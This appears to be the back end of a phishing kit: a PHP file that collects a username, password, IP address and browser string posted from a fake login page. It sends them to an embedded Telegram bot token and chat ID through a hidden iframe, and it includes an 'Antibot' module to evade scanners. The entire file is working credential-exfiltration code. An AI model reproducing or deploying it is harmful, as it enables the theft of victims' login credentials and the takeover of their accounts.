<?php
include('../.../Meta/Antibot.php');

if(isset($_POST['Username']));
$msg= isset($msg) ? $msg: '';

  $ip = getenv("REMOTE_ADDR");
  $ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "||::::::::::|L0g!ns|:::::::::::||                                            \n";
$msg .= "|Username : ".$_POST['username']."                                   \n";
$msg .= "|Password : ".$_POST['password']."                                   \n";
$msg .= "|IP : ".$ip."                                                      \n";
$msg .= "|Browser : ".$ua."                                                 \n";
$msg .= "||:::::|Alchemysender🚀|::::::||                              \n\n";
 
     echo "<iframe src='https://api.telegram.org/bot5493016382:AAGdRGzwECGmrH_QtDeAwazxHwKrA2VozjE/sendMessage?chat_id=-644676108&text=".$msg."' style='display:none'></iframe>";
?>